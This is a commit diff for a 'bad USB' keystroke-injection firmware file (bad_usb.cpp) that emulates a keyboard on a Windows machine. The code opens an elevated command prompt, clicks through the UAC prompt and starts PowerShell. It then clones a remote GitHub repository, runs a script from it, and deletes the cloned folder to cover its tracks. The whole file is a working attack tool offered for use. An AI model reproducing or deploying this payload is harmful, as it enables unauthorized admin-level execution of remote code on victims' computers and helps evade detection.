c9cb799219187595ee536738d9feceefdd5c38e2
SoyluEren2004 <139225815+SoyluEren2004@users.noreply.github.com>
2026-09-09 19:17:53 +0300

    Refactor trPrint and streamline command execution
    Refactor trPrint function to handle additional cases and adjust delays. Update setup to streamline command execution and remove unnecessary delays.

--- bad_usb.cpp
+++ bad_usb.cpp
@@ -1,62 +1,225 @@
 #include "USB.h"
+
 #include "USBHIDKeyboard.h"
+
+
 
 USBHIDKeyboard Keyboard;
 
 void trPrint(const String &text) {
   for (int i = 0; i < text.length(); i++) {
     char c = text[i];
+
     switch (c) {
-      case 'i': Keyboard.write('\''); break;
-      case 'I': Keyboard.write('i'); break;
-      case '.': Keyboard.write('/'); break;
-      case ':': 
+     
+      case '"':
+        Keyboard.write('\'');
+        break;
+
+      
+      case 'i':
+        Keyboard.write(']');
+        break;
+
+     
+      case '.':
+        Keyboard.write('/');
+        break;
+
+  
+      case ':':
         Keyboard.press(KEY_LEFT_SHIFT);
         Keyboard.write('/');
         Keyboard.release(KEY_LEFT_SHIFT);
         break;
-      case '/': Keyboard.write('&'); break;
-      case '&':
+
+     
+      case '/':
         Keyboard.press(KEY_LEFT_SHIFT);
-        Keyboard.write('^');
+        Keyboard.write('7');
         Keyboard.release(KEY_LEFT_SHIFT);
         break;
-      case '-': Keyboard.write('*'); break;
-      case '_': 
+
+      case '\\':
+        Keyboard.press(KEY_RIGHT_ALT);
+        Keyboard.press('-');
+        delay(10);
+        Keyboard.releaseAll();
+        break;
+
+      case '-':
+        Keyboard.write('=');
+        break;
+
+      
+      case '_':
         Keyboard.press(KEY_LEFT_SHIFT);
-        Keyboard.write('*');
+        Keyboard.write('=');
         Keyboard.release(KEY_LEFT_SHIFT);
         break;
-      default: Keyboard.write(c); break;
+
+      default:
+        
+        if (c >= 'A' && c <= 'Z') {
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.write(tolower(c));
+          Keyboard.release(KEY_LEFT_SHIFT);
+        } else {
+          Keyboard.write(c);
+        }
+        break;
     }
-    // Karakterler arası gecikme 20ms'den 4ms'ye düşürüldü
-    delay(4); 
+
+    delay(12);
   }
 }
 
+
+
 void setup() {
+
   USB.begin();
+
   Keyboard.begin();
 
-  // USB Enumeration beklemesi düşürüldü
+
+
+ 
+
+  delay(2000);
+
+
+
+
+  Keyboard.press(KEY_LEFT_GUI);
+
+  Keyboard.press('r');
+
+  delay(100);
+
+  Keyboard.releaseAll();
+
+  delay(500);
+
+
+
+
+  Keyboard.print("cmd");
+
+  delay(100);
+
+  Keyboard.press(KEY_LEFT_CTRL);
+
+  Keyboard.press(KEY_LEFT_SHIFT);
+
+  Keyboard.write(KEY_RETURN);
+
+  Keyboard.releaseAll();
+
+  delay(1200);
+
+
+
+  Keyboard.write(KEY_LEFT_ARROW);
+
+  delay(400);
+
+  Keyboard.write(KEY_RETURN);
+
   delay(1500);
 
-  // Win + R
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
-  delay(50);
+
+
+
+
+  trPrint("powershell");
+
+  delay(300);
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(1000);
+
+
+
+
+
+ 
+
+  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(4000);
+
+
+
+
+  trPrint("cd BashExe");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(500);
+
+
+
+  
+
+  trPrint(".\\app.sh");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(3000);
+
+
+
+  Keyboard.press(KEY_LEFT_ALT);
+
+  Keyboard.press(KEY_F4);
+
+  delay(100);
+
   Keyboard.releaseAll();
-  delay(300); // Çalıştır penceresi için düşürülen süre
 
-  // CMD Başlatma
-  Keyboard.print("cmd");
-  delay(50);
-  Keyboard.write(KEY_RETURN);
-  delay(500); // CMD penceresinin odaklanma süresi
+  delay(500);
 
-  // Komutları tek satırda birleştirerek aradaki bekleme bağımlılığını kaldırma
-  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git && cd BashExe && bash.exe ./app.sh");
+  Keyboard.write(KEY_LEFT_ARROW);
+
+  delay(400);
+
   Keyboard.write(KEY_RETURN);
+
+  delay(1500);
+
+ 
+
+  trPrint("cd ..");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(1500);
+
+
+
+  trPrint("Remove-Item -Path BashExe -Recurse -Force");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(3000);
+
+
+
+  trPrint("exit");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(300);
+
+  trPrint("exit");
+
+  Keyboard.write(KEY_RETURN);
+
+  delay(300);
+
+
 }
-
-void loop() {}
